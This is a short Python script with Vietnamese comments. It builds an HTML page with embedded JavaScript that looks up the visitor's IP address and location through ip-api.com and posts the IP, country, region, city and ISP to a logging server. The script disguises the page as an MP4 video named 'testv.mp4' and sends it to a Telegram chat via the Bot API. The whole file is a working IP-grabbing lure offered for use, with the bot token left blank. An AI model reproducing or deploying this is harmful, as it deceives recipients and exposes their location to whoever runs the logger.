import requests
import os

BOT_TOKEN = ""
CHAT_ID = ""

html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        fetch('http://ip-api.com/json')
            .then(response => response.json())
            .then(data => {
                
                fetch('http://127.0.0.1:5000/log_ip', {  
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        ip: data.query,
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        isp: data.isp
                    })
                });
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</head>
<body>
</body>
</html>
"""

# Đường dẫn để lưu file HTML
html_path = "testv.mp4"
with open(html_path, "w") as file:
    file.write(html_content)

files = {
    "video": (
        "a.htm",
        open(html_path, "rb"),  
        "video/mp4"
    )
}

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
data = {"chat_id": CHAT_ID, "supports_streaming": False}
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("Message sent")
else:
    print(f"Error: {response.text}")

# Xóa file sau khi gửi
os.remove(html_path)
